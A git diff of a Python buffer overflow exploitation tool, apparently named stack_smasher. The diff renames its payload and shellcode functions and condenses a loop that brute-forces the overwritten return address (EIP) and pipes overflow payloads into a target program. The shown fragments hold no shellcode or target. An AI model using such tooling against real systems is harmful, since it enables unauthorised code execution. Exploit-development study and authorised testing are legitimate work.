@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 titlepage = \
-'''
+"""
 ##########################################################################################################
 \#======================================================================================================\#
 \#||                     _             _                              _                               ||\#
@@ -17,18 +17,18 @@ titlepage = \
 \#======================================================================================================\#
 \#||                                                                                                  ||\#
 \#||                                   Written by: Nicholas Morris                                    ||\#
-\#||                                Contact: https://github.com/nm2438                                ||\#
+\#||                             https://github.com/nm2438/stack_smasher                              ||\#
 \#||                                                                                                  ||\#
 \#||                                         Date: 06OCT2020                                          ||\#
 \#||                                                                                                  ||\#
 \#======================================================================================================\#
-\#||    Tool for working with local and remote/network-based buffer overflow exploits. Can            ||\#
+\#||    Tool for working with local and remote/socket-based buffer overflow exploits. Can            ||\#
 \#||    overflow local executables with minimal user interaction. Remote exploits may require         ||\#
 \#||    additional user effort. |!| Tools for bypassing stack canaries to be included in future       ||\#
 \#||    release|!|                                                                                    ||\#
 \#======================================================================================================\#
 ##########################################################################################################
-'''
+"""
 
 # Temp
 def ud():
@@ -154,7 +154,10 @@ class exploit:
             ud()
 
 
-    def set_payload(self):
+    def set_shellcode(self):
+        """
+        Gets input from user and sets exploit shellcode accordingly
+        """
         while True:
             response = get_input("\n#|| How would you like to generate your payload?\n" + \
                 "\n[1] -- Use one of the built-in payloads\n2 -- Specify a msfvenom command" + \
@@ -281,13 +284,13 @@ class exploit:
                 "(Enter a multiple of 2) [16]\n",count_options, default="16") 
                 self.append_nop_count = int(response)
             if not self.shellcode:
-                self.set_payload()
+                self.set_shellcode()
         else:
             # get info for remote buffer overflow exploits
             ud()
 
 
-    def message_generator(self):
+    def payload_generator(self):
         '''
         Generates the overflow-triggering message
         '''
@@ -309,6 +312,9 @@ class exploit:
 
 
     def run(self):
+        """
+        Runs the exploit (i.e. delivers the payload to the target)
+        """
         missing = "\nLooks like something's missing!\n"
         if self.is_local:
             # All local exploits
@@ -347,22 +353,15 @@ class exploit:
         # the given eip will be run twice (add zero, subtract zero)
         responses = []
         for n in range(num+1):
-            # Add n bytes to eip and run
-            self.target_eip = self.target_eip[:4] + str(hex(int(original_eip,16) + 8*n))[-4:]
-            self.message_generator()
-            p1 = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-            out = p1.communicate(input=self.payload)[0].decode()
-            responses.append("".join(out.split("\n")[-2:]))
-            print("\t[*] Sent!")
-            # Subtract n bytes from eip and run
-            self.target_eip = self.target_eip[:4] + str(hex(int(original_eip,16) - 8*n))[-4:]
-            self.message_generator()
-            p2 = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-            out = p2.communicate(input=self.payload)[0].decode()
-            responses.append("".join(out.split("\n")[-2:]))
-            print("\t[*] Sent!")
+            for num in [-n,n]:
+                # Add n bytes to eip and run
+                self.target_eip = str(hex(int(original_eip,16) + 8*num)).replace("0x","")
+                self.payload_generator()
+                p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+                out = p.communicate(input=self.payload)[0].decode()
+                responses.append("".join(out.split("\n")[-2:]))
+                print("\t[*] Sent!")
         # Restore original target_eip
         self.target_eip = original_eip
         show = get_input("\nSaved last line of output from each attempt. View now? (y/[n])\n", \
